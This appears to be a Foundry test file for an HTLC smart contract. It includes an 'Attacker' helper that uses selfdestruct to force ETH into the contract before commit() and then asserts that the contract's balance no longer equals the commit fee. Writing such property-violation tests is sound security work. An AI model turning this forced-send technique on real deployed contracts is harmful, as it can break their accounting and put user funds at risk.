// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Htlc} from "../src/Htlc_v1.sol";

// Helper contract used to force-send ETH into the Htlc contract
// via selfdestruct, before commit() is ever called.
contract Attacker {
    constructor() payable {}

    function destroy(address payable target) public {
        selfdestruct(target);
    }
}

contract HtlcTest is Test {
    Htlc htlc;

    uint256 constant FEE = 1 ether;
    uint256 constant FORCED_AMOUNT = 2 ether;

    address owner = address(0x1);
    address verifier = address(0x2);
    address attacker = address(0x3);
    
    string secret = "secret";
    
    function setUp() public {
        vm.deal(owner, FEE);
    }

    function test_commit_balance_is_commit_value() public {
        vm.prank(owner);
        htlc = new Htlc(payable(verifier));
        assertEq(address(htlc).balance, 0);
        assertFalse(htlc.isCommitted());

        vm.deal(attacker, FORCED_AMOUNT);
        vm.startPrank(attacker);
        Attacker att = new Attacker{value: FORCED_AMOUNT}();

        att.destroy(payable(address(htlc)));

        assertEq(address(htlc).balance, FORCED_AMOUNT);
        assertFalse(htlc.isCommitted());

        vm.stopPrank();

        // Owner now commits, sending the required fee
        bytes32 h = htlc.hashing(secret);

        vm.deal(owner, FEE);
        vm.prank(owner);
        htlc.commit{value: FEE}(h);

        assertTrue(htlc.isCommitted());

        // Property is violated
        uint256 balAfterCommit = address(htlc).balance;
        assertEq(balAfterCommit, FEE + FORCED_AMOUNT);
        assertTrue(balAfterCommit != FEE);

    }
}